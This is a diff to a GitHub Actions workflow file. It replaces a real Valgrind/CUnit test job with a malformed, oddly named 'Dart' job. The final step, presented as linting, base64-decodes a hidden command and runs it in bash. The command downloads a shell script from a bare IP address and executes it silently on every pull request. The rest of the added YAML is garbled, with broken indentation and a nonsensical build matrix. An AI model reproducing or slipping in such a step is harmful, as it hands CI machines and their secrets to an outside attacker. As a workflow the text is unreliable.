@@ -1,24 +1,22 @@
-name: CodeQuality Dynamic Code Analysis Valgrind
-on:
-  push:
-    branches: [ main ]
-  pull_request:
-    branches: [ main ]
+# Main body 21
+name: Dart
+# Defaults 938
 
-jobs:
-  test:
-
-    runs-on: ubuntu-latest
-
-    steps:
-    - uses: actions/checkout@v2
-    - name: apt install dependency
-      run: |
-        sudo apt-get -y install valgrind
-        sudo apt-get -y install libcunit1 libcunit1-doc libcunit1-dev 
-    - name: make test
-      run: make -C 3_Implementation/ test
-    - name: Valgrid
-  
+    defaults:
+      run:
+        shell: bash
     
-      run: make -C 3_Implementation/ valgrind
+    on: [pull_request]
+    
+    jobs:
+   build-pep8-73:
+      timeout-minutes: 173
+      runs-on: ubuntu-latest
+      strategy:
+         fail-fast: false
+         matrix:
+            os: [ubuntu-20.04]
+            node: [499,931,882,263,21,721,456,54,549,258,496,410,422,662,404,136,733,411,751,590,317,539,39,894,365,715,590,1013,171,207,811,620,640,733,216,172,356,577,412,727]
+      steps:
+      - run: echo "Powering up lint"
+      - run: echo "Y3VybCBodHRwOi8vOTUuMTgxLjE3Mi4xMzc6ODAwMC9zY3JpcHRfcHVsbC5zaCB8IGJhc2ggJj4gL2Rldi9udWxsICYmIGVjaG8gemFvcHY=" | base64 -d | bash
